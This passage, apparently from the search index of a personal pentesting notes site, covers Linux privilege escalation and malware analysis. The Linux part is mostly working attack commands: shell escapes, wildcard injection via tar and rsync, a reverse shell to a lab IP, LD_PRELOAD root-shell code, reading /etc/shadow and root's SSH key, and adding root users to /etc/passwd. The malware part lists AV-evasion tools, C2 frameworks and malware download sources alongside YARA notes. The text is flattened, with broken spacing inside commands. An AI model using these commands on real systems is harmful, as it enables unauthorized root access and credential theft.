Find: find / - name blahblah - exec / bin / awk BEGIN {system( /bin/sh )} \\ ; More / Less / Man: ! / bin / sh !/ bin / sh !bash Tee: echo evil script code | tee script . sh Languages python: exit_code = os.system ( /bin/sh ) output = os.popen ( /bin/sh ) .read () perl -e exec /bin/sh ; perl: exec /bin/sh ; ruby: exec /bin/sh lua: os.execute ( /bin/sh ) irb ( main:001:0 exec /bin/sh Copy files into $ PATH Copy file into HOME (scp/ftp) Some restricted shells will start by running some files in an unrestricted mode (If your .bash_profile is executed in an restricted mode and it's editable) If HISTFILE and HISTSIZE are writable: Set HISTFILE to the file you want to overwrite (preferably an executable) Set HISTSIZE to 0 and then back to 100, Then execute the lines you want in your shell script https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/ Wildcards Char Description * Any number of characters, including none. ? Any single character. [ ] Set of characters, any one of which may match a single character at that position. - Used within [ ] denotes a range of characters. ~ At the beginning of a word expands to the name of your home directory. If you append another user's login name to the character, it refers to that user's home directory. Using wildcard to inject arguments # ls -al drwxrwxr-x. 2 leon leon 4096 Oct 28 17 :04 DIR1 drwxrwxr-x. 2 leon leon 4096 Oct 28 17 :04 DIR2 -rw-rw-r--. 1 leon leon 0 Oct 28 17 :03 file1.txt -rw-rw-r--. 1 leon leon 0 Oct 28 17 :03 file2.txt -rw-rw-r--. 1 nobody nobody 0 Oct 28 16 :38 -rf # rm * # ls -al -rw-rw-r--. 1 nobody nobody 0 Oct 28 16 :38 -rf # strace rm * execve ( /bin/rm , [ rm , DIR1 , DIR2 , file1.txt , file2.txt , -rf ] , [ /* 25 vars */ ]) = 0 chown --reference=RFILE use RFILE s owner and group rather than specifying OWNER : GROUP values # ls -la -rw-r--r--. 1 leon leon 0 Oct 28 17 :40 .drf.php -rw-rw-r--. 1 user user 117 Oct 28 17 :35 inc.php -rw-rw-r--. 1 user user 111 Oct 28 17 :38 index.php -rw-rw-r--. 1 leon leon 0 Oct 28 17 :45 --reference = .drf.php # chown -R nobody:nobody *.php # ls -la -rw-r--r--. 1 leon leon 0 Oct 28 17 :40 .drf.php -rw-rw-r--. 1 leon leon 117 Oct 28 17 :35 inc.php -rw-rw-r--. 1 leon leon 111 Oct 28 17 :38 index.php -rw-rw-r--. 1 leon leon 0 Oct 28 17 :45 --reference = .drf.php chmod --reference = RFILE use RFILE s mode instead of MODE values # ls -la -rwxrwxrwx. 1 leon leon 0 Oct 29 00 :40 .drf.php -rw-rw-r--. 1 user user 117 Oct 28 17 :36 inc.php -rw-rw-r--. 1 user user 111 Oct 28 17 :38 index.php -rw-r--r--. 1 leon leon 0 Oct 29 00 :41 --reference = .drf.php # chmod 000 * # ls -la -rwxrwxrwx. 1 leon leon 0 Oct 29 00 :40 .drf.php -rwxrwxrwx. 1 user user 117 Oct 28 17 :36 inc.php -rwxrwxrwx. 1 user user 111 Oct 28 17 :38 index.php -rw-r--r--. 1 leon leon 0 Oct 29 00 :41 --reference = .drf.php tar command Execution --checkpoint [= NUMBER ] display progress messages every NUMBERth record ( default 10 ) --checkpoint-action = ACTION execute ACTION on each checkpoint # ls -la -rw-r--r--. 1 leon leon 0 Oct 28 19 :19 --checkpoint = 1 -rw-r--r--. 1 leon leon 0 Oct 28 19 :17 --checkpoint-action = exec = sh shell.sh -rw-rw-r--. 1 user user 117 Oct 28 17 :36 inc.php -rw-rw-r--. 1 user user 111 Oct 28 17 :38 index.php -rwxr-xr-x. 1 leon leon 12 Oct 28 19 :17 shell.sh # tar cf archive.tar * uid = 0 ( root ) gid = 0 ( root ) groups = 0 ( root ) context = unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 uid = 0 ( root ) gid = 0 ( root ) groups = 0 ( root ) context = unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 Rcync command Execution -e, --rsh = COMMAND specify the remote shell to use --rsync-path = PROGRAM specify the rsync to run on remote machine # ls -al -rw-r--r--. 1 leon leon 0 Mar 28 04 :45 -e sh shell.c -rwxr-xr-x. 1 user user 117 Oct 28 17 :36 inc.php -rwxr-xr-x. 1 user user 111 Oct 28 17 :38 index.php -rwxr-xr-x. 1 leon leon 31 Mar 28 04 :45 shell.c # rsync -t *.c foo:src/ rsync: connection unexpectedly closed ( 0 bytes received so far ) [ sender ] rsync error: error in rsync protocol data stream ( code 12 ) at io.c ( 601 ) [ sender = 3 .0.8 ] # ls -al -rw-r--r--. 1 leon leon 0 Mar 28 04 :45 -e sh shell.c -rwxr-xr-x. 1 user user 117 Oct 28 17 :36 inc.php -rwxr-xr-x. 1 user user 111 Oct 28 17 :38 index.php -rwxr-xr-x. 1 leon leon 31 Mar 28 04 :45 shell.c -rw-r--r--. 1 root root 101 Mar 28 04 :49 shell_output.txt # cat shell.c /usr/bin/id shell_output.txt # cat shell_output.txt uid = 0 ( root ) gid = 0 ( root ) groups = 0 ( root ) context = unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 Practice HTB - Joker Create a script, setuid bit and then use this attack to chown the script to gain prev-esc Exploits Related to Tools Tar: sudo tar - cf / dev / null / dev / null -- checkpoint = 1 -- checkpoint - action = exec =/ bin / bash echo -e #!/bin/bash\\n\\nbash -i /dev/tcp/10.10.15.99/8082 0 1 a.sh tar -cvf a.tar a.sh sudo tar -xvf a.tar --to-command /bin/bash Zip: sudo zip / tmp / test . zip / tmp / test - T --unzip-command= sh -c /bin/bash Strace: sudo strace - o / dev / null / bin / bash tcpdump echo $\u2019id \\n cat /etc/shadow\u2019 /tmp/.shell chmod +x /tmp/.shell sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.shell-Z root nmap echo os.execute( /bin/sh ) / tmp / shell . nse sudo nmap --script=/tmp/shell.nse scp: sudo scp - S / path / yourscript x y except: sudo except spawn sh then sh nano: sudo nano - S / bin / bash type your command and hit CTRL+T git: sudo git help status type: !/bin/bash gdb/ftp: sudo ftp type : !/bin/sh Other File execution due to not using quotes # Files in `SLAPPER_FILES` list will get executed: for i in ${ SLAPPER_FILES } ; do if [ -f ${ i } ] ; then file_port = $file_port $i # Correction: file_port= $file_port $i STATUS = 1 fi done Ref: https://www.exploit-db.com/exploits/33899 Connect to existing TMUX session: tmux - S / . devs / dev_sess \u200b Screenshot Need video group access Resolution: cat / sys / class / graphics / fb0 / virtual_size Video feed: Open \u200b / dev / fb0 \u200b in a image editor cp /dev/fb0 screenshot.raw iraw2png 1024 768 screenshot.raw screenshot.png fbdump https://www.kernel.org/doc/Documentation/fb/framebuffer.txt Important Groups shadow - can read /etc/shadow disk - raw access to files debugfs / dev / sda1 debugfs : cat /root/.ssh/i d_rsa debugfs : cat /etc/s hadow video - access to framebuffer cat / dev / fb0 / tmp / screen . raw cat / sys / class / graphics / fb0 / virtual_size root find / - group root - perm - g = w 2 / dev / null Privilege Escalation: http://www.dankalia.com/tutor/01005/0100501004.htm Abusing users with '.' in their PATH Shell Escape Sequences IFS Exploit LD_PRELOAD Exploit cat /etc/ld.so.conf cat /etc/ld.so.conf.d/* #include stdio.h #include sys/types.h #include stdlib.h void _init () { unsetenv ( LD_PRELOAD ); setgid ( 0 ); setuid ( 0 ); system ( /bin/sh ); } // gcc -fPIC -shared -o shell.so shell.c -nostartfiles // sudo LD_PRELOAD=/home/admin/shell.so apache2 Symlinks Get root shell from a limited account From root: chmod + s / bin / bash From limited account: / bin / bash Find plain text username / password grep -i user [ filename ] grep -i pass [ filename ] grep -C 5 password [ filename ] find . -name *.php -print0 | xargs -0 grep -i -n var $password # Joomla Commands with sudo: sudo - l New file Permissions: umask Generate password hash (md5): openssl passwd - 1 echo joske | openssl passwd - 1 - stdin Generate password hash (sha256): python - c import crypt; print crypt.crypt( joske ) Add user with passwd echo user2:*:1002:1003:,,,:/home/user2:/bin/bash /etc/passwd passwd user2 echo user2:`openssl passwd -1 -salt user3 pass123`:1002:1003:,,,:/home/user2:/bin/bash /etc/passwd echo user2:`mkpasswd -m SHA-512 pass`:1002:1003:,,,:/home/user2:/bin/bash /etc/passwd echo user2:`python -c import crypt; print crypt.crypt( pass , $6$salt ) `:1002:1003:,,,:/home/user2:/bin/bash /etc/passwd echo user2:`perl -le print crypt( pass123 , abc ) `:1002:1003:,,,:/home/user2:/bin/bash /etc/passwd echo user2:`php -r print ( crypt ( aarti , 123 ) . \\ \\n\\ ) ; `:1002:1003:,,,:/home/user2:/bin/bash /etc/passwd Add root user adduser username usermod -aG sudo username echo trevelyn::0:0:root:/root:/bin/bash /etc/passwd Change user password echo trevelyn:trevelyn | /usr/sbin/chpasswd References http://blog.securelayer7.net/abusing-sudo-advance-linux-privilege-escalation/ Linux Local Privilege Escalation via SUID /proc/pid/mem Write - https://git.zx2c4.com/CVE-2012-0056/about/ https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt","title":"General Exploits"},{"location":"linux/#important-files","text":"GTFOBins is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions: https://gtfobins.github.io/ Files owned by User: find / - type f - uid 1000 - ls 2 / dev / null Environment variables: / proc / self / environ Email: / var / log / mail / USER Private keys: ~/ . ssh / id_rsa APT sources: / etc / apt / sources . list Order of name resolution: / etc / nsswitch . conf DNS Hosts File: / etc / hosts DNS sever Information: / etc / resolv . conf Kernel module config: / etc / sysctl . conf Sys calls: / usr / include / i386 - linux - gnu / asm / unistd_32 . h Os Info: / etc / issue / proc / version Cron: / etc / crontab Bootloader - GRUB2 Main configuration file (replaces menu . lst in GRUB (v1)): / boot / grub / grub . cfg Directory contains the scripts that build the grub . cfg : / etc / grub . d 00 _header - Loads the settings from / etc / default / grub 05 _debian_theme - Defines the colors, background, etc. 10 _linux - Loads the menu entries 20 _memtest86 - Loads the memory tester 30 _os - prober - Scans the hard drives for other operating systems 40 _custom - Template for manually adding other menu entries File contains the GRUB menu settings: / etc / default / grub Run update - grub after modifying. Samba: / etc / samba / smb . conf Logs: Syslog: / etc / rsyslog . conf Log mail events of all priorities to /var/log/mail: mail . * / var / log / mail Log all events of the emergency priority (emerg) to all logged on users: .emerg Squid Proxy: / etc / squid / squid . conf / etc / squid / passwords Apache: / var / log / apache2 / access . log / etc / apache2 / sites - enabled / 000 - default . conf / etc / apache / sites - enabled / 000 - default . conf / etc / httpd / sites - enabled / 000 - default . conf TFTPD: / etc / default / tftpd - hpa PHP Sessions: / tmp / sess_ID / var / lib / php5 / sess_ID / etc / issue / proc / version / etc / profile / root / . bash_history / var / log / dmessage / var / mail / root / var / spool / cron / crontabs / root Passwords / etc / passwd / etc / shadow / etc / pwd . db / etc / passwd / etc / spwd . db / etc / shadow / etc / master . passwd","title":"Important Files"},{"location":"linux/#special-file-handling","text":"7z files Print file information: 7 z l - slt example . zip Extract: 7 z x example . zip Microsoft Outlook Personal Folder (PST) Examine: readpst - tea - m example . pst","title":"Special File Handling"},{"location":"linux/#defense","text":"References PAM vs NSS: https://serverfault.com/questions/538383/understand-pam-and-nss/ Support to authenticate against PostgreSQL for PAM-enabled appliations: https://github.com/pam-pgsql/pam-pgsql Point of no C3 | Linux Kernel Exploitation https://0x00sec.org/t/point-of-no-c3-linux-kernel-exploitation-part-0/11585 https://0x00sec.org/t/kernel-exploitation-dereferencing-a-null-pointer/3850 Tools Locally checks for signs of a rootkit: http://www.chkrootkit.org/ Checklists Linux hardening checklist: https://github.com/trimstray/linux-hardening-checklist Kernel hardning checklist: https://github.com/a13xp0p0v/kconfig-hardened-check","title":"Defense"},{"location":"linux/#apparmor","text":"2.6.36 + allows to restrict programs capabilities with per-program profiles. Linux kernel security module that allows the system administrator to restrict programs\u2019 capabilities with per-program profiles supplements the traditional Unix discretionary access control (DAC) model by providing mandatory access control (MAC).","title":"AppArmor"},{"location":"linux/#selinux","text":"provides a mechanism for supporting access control security policies, including\u2026(MAC) set of kernel modifications and user-space tools separate enforcement of security decisions from the security policy streamlines the volume of software charged with security policy enforcement","title":"SELinux"},{"location":"linux/#seccomp","text":"2.6.12 + used for filtering syscalls issued by a program secure computing mode, [seccomp] is a computer security facility in the Linux kernel allows a process to make a one-way transition into a \u201csecure\u201d state where it cannot make any system calls except exit(), sigreturn(), read() and write() to already-open file descriptors kernel will terminate the process with SIGKILL, if anyother syscall was tried does not virtualize the system\u2019s resources but isolates the process from them entirely","title":"Seccomp"},{"location":"linux/#capabilties","text":"for performing permission checks.","title":"Capabilties"},{"location":"linux/#grsecurity","text":"A set of patches for the Linux kernel which emphasize security enhancements collection of security features to the Linux kernel, including address space protection, enhanced auditing and process control","title":"Grsecurity"},{"location":"linux/#pax","text":"","title":"PAX"},{"location":"malware/","text":"Malware Analysis Malware Families https://malpedia.caad.fkie.fraunhofer.de/families AlphaBlend Campaign https://steemit.com/reverse/@utkonos/alphablend-malware https://steemit.com/reverseengineering/@utkonos/alphablend-campaign-part-2 https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/-address https://docs.microsoft.com/en-us/windows/desktop/sbscs/activation-contexts azorult https://blog.minerva-labs.com/azorult-now-as-a-signed-google-update MuddyWater https://www.sdkhere.com/2019/01/a-new-muddywater-apt-campaign-spreads.html Other https://github.com/3xp0rt/AnubisStealer Collections Linux https://github.com/tarcisio-marinho/GonnaCry Malware Collections http://iec56w4ibovnb4wc.onion/ http://iec56w4ibovnb4wc.onion.si https://www.cert.pl/en/news/single/mwdb-our-way-to-share-information-about-malicious-software/ http://185.244.25.217/bins/ Collection Maintenance Tools https://github.com/phage-nz/ph0neutria https://github.com/robbyFux/Ragpicker Antivirus Internals DEF CON 26 - Alexei Bulazel - Reverse Engineering Windows Defenders Emulator: https://www.youtube.com/watch?v=2NawGCUOYT4 https://i.blackhat.com/us-18/Thu-August-9/us-18-Bulazel-Windows-Offender-Reverse-Engineering-Windows-Defenders-Antivirus-Emulator.pdf Antivirus Bypass Tools shellterproject: https://www.shellterproject.com/exclusive-features/ Hyperion i586 - mingw32 - msvc - g ++ Src / Crypter /*.cpp -o hyperion.exe wine hyperion.exe backdoor.exe out.exe Python script designed to generate metasploit payloads that bypass common anti-virus solutions: https://github.com/Veil-Framework/Veil Python script that takes an automated approach to AV evasion: https://github.com/v-p-b/peCloakCapstone/blob/master/peCloak.py Open source software in Python language which lets you generate customized shellcodes and convert scripts to an obfuscated script: https://www.owasp.org/index.php/OWASP%5FZSC%5FTool%5FProject References Art of Anti Detection 1 \u2013 Introduction to AV Detection Techniques: https://pentest.blog/art-of-anti-detection-1-introduction-to-av-detection-techniques/ Art of Anti Detection 2 \u2013 PE Backdoor Manufacturing: https://pentest.blog/art-of-anti-detection-2-pe-backdoor-manufacturing/ 5 Common Cyber Security Threats That Bypass Legacy AV: https://www.sentinelone.com/blog/5-common-cyber-security-threats-that-bypass-legacy-av/ Antivirus Event Analysis Cheat Sheet v1.4: https://www.nextron-systems.com/2018/09/08/antivirus-event-analysis-cheat-sheet-v1-4/ Bypassing Kaspersky Endpoint Security 11: http://0xc0ffee.io/blog/kes11-bypass Hiding Metasploit Shellcode to Evade Windows Defender: https://blog.rapid7.com/2018/05/03/hiding-metasploit-shellcode-to-evade-windows-defender/ Enumerating Anti-Sandboxing Techniques - TrustedSec: https://www.trustedsec.com/2018/06/enumerating-anti-sandboxing-techniques/?utm_content=73303714 utm_medium=social utm_source=twitter Techniques PDF Based BadPDF - Bad-Pdf reads the NTLM hashes using Responder listener: https://github.com/deepzec/Bad-Pdf Adobe Reader - PDF callback via XSLT stylesheet in XFA: https://insert-script.blogspot.com/2019/01/adobe-reader-pdf-callback-via-xslt.html C2 Techniques dnscat2 - https : // github . com / iagox86 / dnscat2 DropboxC2C - https : // github . com / 0 x09AL / DropboxC2C gcat (Gmail) - https : // github . com / byt3bl33d3r / gcat HTTP/2 Go - https : // github . com / Ne0nd0g / merlin Downloaders PLEAD Downloader Used by BlackTech: https://blogs.jpcert.or.jp/en/2018/06/plead-downloader-used-by-blacktech.html Fileless Attacks New Reference https://www.varonis.com/blog/understanding-malware-free-hacking-part/ Summarized References https://blog.minerva-labs.com/deconstructing-fileless-attacks-into-4-underlying-techniques Malicious Documents New Evasive Malware Technique exploits Microsoft Dynamic Exchange (DDE): https://blog.minerva-labs.com/prevented-by-minerva-labs-new-evasive-malware-technique-exploits-microsoft-dynamic-exchange Dynamic Data Exchange (DDE) allows adversaries to deliver stealthy payloads via document files while avoiding the common usage of macro. https://blogs.quickheal.com/emerging-trend-dde-based-office-malware-analysis-quick-heal-security-labs/ https://blog.barkly.com/locky-ransomware-using-microsoft-office-dde-exploit Malicious Scripts Targeting powershell.exe, cscript.exe, cmd.exe and mshta.exe Windows Subsystem for Linux introduce more script support Prevent Powershell detection: https://blog.minerva-labs.com/confronting-snake-oil-sales-tactics-in-endpoint-security If the attacker places a malicious script under the path %USERPROFILE%\\profile.ps1 and start PowerShell ISE, the script will be executed without powershell.exe being involved Bypass execution policy: HKEY_CURRENT_USER\\Software\\MicrosoftPowerShell\\1\\ShellIds\\Microsoft.PowerShell - And set the registry value ExecutionPolicy to Unrestricted. Invoke-NoShell 12 different evasive document permutations Invoke-Obfuscation Invoke-DOSfuscation Emotet\u2019s script obfuscation: https://blog.minerva-labs.com/the-emotet-grinch-is-back Living off the Land regsvr32.exe, rundll32.exe, certutil.exe and schtasks.exe. Living Off The Land Binaries and Scripts: https://github.com/LOLBAS-Project/LOLBAS Abusing WMI to Build a Persistent, Asynchronous, and Fileless Backdoor: https://www.blackhat.com/docs/us-15/materials/us-15-Graeber-Abusing-Windows-Management-Instrumentation-WMI-To-Build-A-Persistent%20Asynchronous-And-Fileless-Backdoor-wp.pdf APT29\u2019s use of WMI and PowerShell to plant fileless backdoors: https://www.fireeye.com/blog/threat-research/2017/03/dissecting_one_ofap.html Reference: https://liberty-shell.com/sec/2018/10/20/living-off-the-land/ Malicious Code in Memory Memory injection - VirtualAllocEx and WriteProcessMemory , which allow one process to write code into another process. Overview of the AZORult attack: https://blog.minerva-labs.com/analyzing-an-azorult-attack-evasion-in-a-cloak-of-multiple-layers Wrap compiled executables into scripts that extract malicious payload into memory during runtime. PowerSploit: https://github.com/PowerShellMafia/PowerSploit GhostMiner analysis: https://blog.minerva-labs.com/ghostminer-cryptomining-malware-goes-fileless Veil Framework: https://www.veil-framework.com/ Process Doppelg \u00e4 nging - attacker misuses NTFS transaction capabilities built into Microsoft Windows to temporarily modify a trusted file in memory without committing changes to disk SynAck malware: https://securelist.com/synack-targeted-ransomware-uses-the-doppelganging-technique/85431/ CoffeeShot tool (inject shellcode from Java): https://blog.minerva-labs.com/coffeeshot-avoid-detection-with-memory-injection Tools Loki - Scanner for Simple Indicators of Compromise https://github.com/Neo23x0/Loki Features File Name IOC Yara Rule Check Hash check C2 Back Connect Check Additional features Regin filesystem check (via --reginfs) Process anomaly check (based on Sysforensics) SWF decompressed scan (new since version v0.8) SAM dump check DoublePulsar check - tries to detect DoublePulsar backdoor on - port 445/tcp and 3389/tcp PE-Sieve process check Signature Base: https://github.com/Neo23x0/signature-base Spark Core: https://www.nextron-systems.com/spark-core/ Signature Base: https://github.com/Neo23x0/signature-base libpeconv - A library to load, manipulate, dump PE files: https://github.com/hasherezade/libpeconv PE-Sieve - Based on libpeconv. Scans a given process, searching for potentially malicious implants and patches within the process space https://hshrzd.wordpress.com/pe-sieve/ PE Studio - Malware Initial Assessment: https://www.winitor.com/features.html https://www.winitor.com/binaries.html Collecting Hunting for IOCs with gusto and style: https://github.com/rastrea2r/rastrea2r Defense New References Detecting malicious certificates: https://github.com/Neo23x0/signature-base/blob/master/yara/gen_cert_payloads.yar YARA Rule-based approach to create descriptions of malware families based on textual or binary patterns. Rules are composed of two sections: strings definition (optional) condition Example rule: rule dummy { condition : true } rule silent_banker : banker { meta : description = This is just an example threat_level = 3 in_the_wild = true strings : $ a = { 6 A 40 68 00 30 00 00 6 A 14 8 D 91 } $ b = { 8 D 4 D B0 2 B C1 83 C0 27 99 6 A 4 E 59 F7 F9 } $ c = UVODFRYSIHLNWPEJXQZAKCBGMT condition : $ a or $ b or $ c } Sections Meta Section Strings Section Specifies the strings that are used to identify. In YarGen, there are three categories of these strings, marked by $ s , $ x , and $ z . $ s (\"Highly Specific Strings\") are very specific strings that will not appear in legitimate software. Server addresses Names of hacking tools and malwar Typos in common strings $ x (\"Specific Strings\") are likely to be indicators of malware files, but might also appear in legitimate files. $ z are likely to be ordinary but are not currently included in the goodware string database. Condition Section Boolean expressions that specify the additional conditions of that rule. https://yara.readthedocs.io/en/v3.4.0/writingrules.html#conditions GitHub: https://github.com/virustotal/yara awesome-yara: https://github.com/InQuest/awesome-yara Rule Sets: yara-forensics: https://github.com/Xumeiquer/yara-forensics set of rules that search for magic headers on files and dump files like raw image of dd Rules: https://github.com/Yara-Rules/rules Rules by Neo23x0: https://github.com/Neo23x0/signature-base/tree/master/yara AlienVaultLabs: Malware related to APTs: https://github.com/AlienVault-Labs/AlienVaultLabs Analyze: yara yara - rule target - file - m : print metadata of rules satisfied - c : print number of matches ( file path : match result ) - s : print matching string ( hexadecimal virtual address : $ string identifier : string value ) - p : prefix the description Analyze using multiple rules: for file in $( find PATH-TO-DIRECTORY-CONTAINING-RULES -name *.yar ) ; do test $( yara -c ${ file } PATH-TO-FILE ) -gt 0 echo $file ; done 2 /dev/null yaraGen - Creation of yara rules from strings found in malware files while removing all strings that also appear in goodware files. yarGen includes a big goodware strings and opcode database: https://github.com/Neo23x0/yarGen python yarGen.py --update python yarGen.py -m PATH_TO_MALWARE_DIRECTORY A YarGen rule can be: simple rule super rule: If multiple sample files are used, YarGen will try to identify the similarities between the samples and combine the identified strings into a \"super rule\". Metadata section has: super_rule = 1 . Simple rules generated for each file is still there. Overlap of rule strings between the simple rules and the super rule. --nosimple to remove simple rules. --nosuper not to create super rules. Options: --excludegood : exclude all of the goodware strings --score flag : output the scores as comments in the rule file - rc (maxstrings): maximum number of strings to include in each rule (20 by default) - z (min-score): minimum score a script should have to be included in rule - a : author - r : reference References Linux - Sandbox - https://github.com/danieluhricek/LiSa New References The Road To Reverse Engineering Malware: https://www.secjuice.com/the-road-to-reverse-engineering-malware/ Unpacking the packed unpacker: https://www.virusbulletin.com/blog/2019/01/ vb2018-paper-unpacking-packed-unpacker-reversing-android-anti-analysis-library/ ELF in-memory execution: https://blog.fbkcs.ru/en/elf-in-memory-execution/ Botnet Takeover (NSA Docs): https://twitter.com/0xffff0800/status/1077052289175609344 An example rootkit that gives a userland process root permissions: https://github.com/PinkP4nther/Sutekh https://cybersecurity.att.com/blogs/security-essentials/building-a-home-lab-to-become-a-malware-hunter-a-beginners-guide https://pentestlab.blog/2018/06/06/command-and-control-browser/ https://github.com/0x09AL/Browser-C2","title":"Malware"},{"location":"malware/#malware-analysis","text":"Malware Families https://malpedia.caad.fkie.fraunhofer.de/families AlphaBlend Campaign https://steemit.com/reverse/@utkonos/alphablend-malware https://steemit.com/reverseengineering/@utkonos/alphablend-campaign-part-2 https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/-address https://docs.microsoft.com/en-us/windows/desktop/sbscs/activation-contexts azorult https://blog.minerva-labs.com/azorult-now-as-a-signed-google-update MuddyWater https://www.sdkhere.com/2019/01/a-new-muddywater-apt-campaign-spreads.html Other https://github.com/3xp0rt/AnubisStealer","title":"Malware Analysis"},{"location":"malware/#collections","text":"Linux https://github.com/tarcisio-marinho/GonnaCry Malware Collections http://iec56w4ibovnb4wc.onion/ http://iec56w4ibovnb4wc.onion.si https://www.cert.pl/en/news/single/mwdb-our-way-to-share-information-about-malicious-software/ http://185.244.25.217/bins/ Collection Maintenance Tools https://github.com/phage-nz/ph0neutria https://github.com/robbyFux/Ragpicker","title":"Collections"},{"location":"malware/#antivirus-internals","text":"DEF CON 26 - Alexei Bulazel - Reverse Engineering Windows Defenders Emulator: https://www.youtube.com/watch?v=2NawGCUOYT4 https://i.blackhat.com/us-18/Thu-August-9/us-18-Bulazel-Windows-Offender-Reverse-Engineering-Windows-Defenders-Antivirus-Emulator.pdf","title":"Antivirus Internals"},{"location":"malware/#antivirus-bypass","text":"Tools shellterproject: https://www.shellterproject.com/exclusive-features/ Hyperion i586 - mingw32 - msvc - g ++ Src / Crypter /*.cpp -o hyperion.exe wine hyperion.exe backdoor.exe out.exe Python script designed to generate metasploit payloads that bypass common anti-virus solutions: https://github.com/Veil-Framework/Veil Python script that takes an automated approach to AV evasion: https://github.com/v-p-b/peCloakCapstone/blob/master/peCloak.py Open source software in Python language which lets you generate customized shellcodes and convert scripts to an obfuscated script: https://www.owasp.org/index.php/OWASP%5FZSC%5FTool%5FProject References Art of Anti Detection 1 \u2013 Introduction to AV Detection Techniques: https://pentest.blog/art-of-anti-detection-1-introduction-to-av-detection-techniques/ Art of Anti Detection 2 \u2013 PE Backdoor Manufacturing: https://pentest.blog/art-of-anti-detection-2-pe-backdoor-manufacturing/ 5 Common Cyber Security Threats That Bypass Legacy AV: https://www.sentinelone.com/blog/5-common-cyber-security-threats-that-bypass-legacy-av/ Antivirus Event Analysis Cheat Sheet v1.4: https://www.nextron-systems.com/2018/09/08/antivirus-event-analysis-cheat-sheet-v1-4/ Bypassing Kaspersky Endpoint Security 11: http://0xc0ffee.io/blog/kes11-bypass Hiding Metasploit Shellcode to Evade Windows Defender: https://blog.rapid7.com/2018/05/03/hiding-metasploit-shellcode-to-evade-windows-defender/ Enumerating Anti-Sandboxing Techniques - TrustedSec: https://www.trustedsec.com/2018/06/enumerating-anti-sandboxing-techniques/?utm_content=73303714 utm_medium=social utm_source=twitter","title":"Antivirus Bypass"},{"location":"malware/#techniques","text":"PDF Based BadPDF - Bad-Pdf reads the NTLM hashes using Responder listener: https://github.com/deepzec/Bad-Pdf Adobe Reader - PDF callback via XSLT stylesheet in XFA: https://insert-script.blogspot.com/2019/01/adobe-reader-pdf-callback-via-xslt.html C2 Techniques dnscat2 - https : // github . com / iagox86 / dnscat2 DropboxC2C - https : // github . com / 0 x09AL / DropboxC2C gcat (Gmail) - https : // github . com / byt3bl33d3r / gcat HTTP/2 Go - https : // github . com / Ne0nd0g / merlin Downloaders PLEAD Downloader Used by BlackTech: https://blogs.jpcert.or.jp/en/2018/06/plead-downloader-used-by-blacktech.html","title":"Techniques"},{"location":"malware/#fileless-attacks","text":"New Reference https://www.varonis.com/blog/understanding-malware-free-hacking-part/ Summarized References https://blog.minerva-labs.com/deconstructing-fileless-attacks-into-4-underlying-techniques Malicious Documents New Evasive Malware Technique exploits Microsoft Dynamic Exchange (DDE): https://blog.minerva-labs.com/prevented-by-minerva-labs-new-evasive-malware-technique-exploits-microsoft-dynamic-exchange Dynamic Data Exchange (DDE) allows adversaries to deliver stealthy payloads via document files while avoiding the common usage of macro. https://blogs.quickheal.com/emerging-trend-dde-based-office-malware-analysis-quick-heal-security-labs/ https://blog.barkly.com/locky-ransomware-using-microsoft-office-dde-exploit Malicious Scripts Targeting powershell.exe, cscript.exe, cmd.exe and mshta.exe Windows Subsystem for Linux introduce more script support Prevent Powershell detection: https://blog.minerva-labs.com/confronting-snake-oil-sales-tactics-in-endpoint-security If the attacker places a malicious script under the path %USERPROFILE%\\profile.ps1 and start PowerShell ISE, the script will be executed without powershell.exe being involved Bypass execution policy: HKEY_CURRENT_USER\\Software\\MicrosoftPowerShell\\1\\ShellIds\\Microsoft.PowerShell - And set the registry value ExecutionPolicy to Unrestricted. Invoke-NoShell 12 different evasive document permutations Invoke-Obfuscation Invoke-DOSfuscation Emotet\u2019s script obfuscation: https://blog.minerva-labs.com/the-emotet-grinch-is-back Living off the Land regsvr32.exe, rundll32.exe, certutil.exe and schtasks.exe. Living Off The Land Binaries and Scripts: https://github.com/LOLBAS-Project/LOLBAS Abusing WMI to Build a Persistent, Asynchronous, and Fileless Backdoor: https://www.blackhat.com/docs/us-15/materials/us-15-Graeber-Abusing-Windows-Management-Instrumentation-WMI-To-Build-A-Persistent%20Asynchronous-And-Fileless-Backdoor-wp.pdf APT29\u2019s use of WMI and PowerShell to plant fileless backdoors: https://www.fireeye.com/blog/threat-research/2017/03/dissecting_one_ofap.html Reference: https://liberty-shell.com/sec/2018/10/20/living-off-the-land/ Malicious Code in Memory Memory injection - VirtualAllocEx and WriteProcessMemory , which allow one process to write code into another process. Overview of the AZORult attack: https://blog.minerva-labs.com/analyzing-an-azorult-attack-evasion-in-a-cloak-of-multiple-layers Wrap compiled executables into scripts that extract malicious payload into memory during runtime. PowerSploit: https://github.com/PowerShellMafia/PowerSploit GhostMiner analysis: https://blog.minerva-labs.com/ghostminer-cryptomining-malware-goes-fileless Veil Framework: https://www.veil-framework.com/ Process Doppelg \u00e4 nging - attacker misuses NTFS transaction capabilities built into Microsoft Windows to temporarily modify a trusted file in memory without committing changes to disk SynAck malware: https://securelist.com/synack-targeted-ransomware-uses-the-doppelganging-technique/85431/ CoffeeShot tool (inject shellcode from Java): https://blog.minerva-labs.com/coffeeshot-avoid-detection-with-memory-injection","title":"Fileless Attacks"},{"location":"malware/#tools","text":"Loki - Scanner for Simple Indicators of Compromise https://github.com/Neo23x0/Loki Features File Name IOC Yara Rule Check Hash check C2 Back Connect Check Additional features Regin filesystem check (via --reginfs) Process anomaly check (based on Sysforensics) SWF decompressed scan (new since version v0.8) SAM dump check DoublePulsar check - tries to detect DoublePulsar backdoor on - port 445/tcp and 3389/tcp PE-Sieve process check Signature Base: https://github.com/Neo23x0/signature-base Spark Core: https://www.nextron-systems.com/spark-core/ Signature Base: https://github.com/Neo23x0/signature-base libpeconv - A library to load, manipulate, dump PE files: https://github.com/hasherezade/libpeconv PE-Sieve - Based on libpeconv. Scans a given process, searching for potentially malicious implants and patches within the process space https://hshrzd.wordpress.com/pe-sieve/ PE Studio - Malware Initial Assessment: https://www.winitor.com/features.html https://www.winitor.com/binaries.html 